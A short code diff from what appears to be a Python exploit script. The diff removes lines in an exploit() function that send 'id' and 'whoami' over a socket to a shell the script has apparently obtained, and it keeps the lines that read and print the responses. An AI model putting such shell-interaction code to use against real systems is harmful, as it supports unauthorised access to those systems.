@@ -42,12 +42,6 @@ def exploit():
     
     # Send commands to the shell
     try:
-        s.send(b"id\n")
-        response = s.recv(1024)
-        print(f"Response: {response}")
-        
-        # If we get a shell, we can send more commands
-        s.send(b"whoami\n")
         response = s.recv(1024)
         print(f"Response: {response}")
         
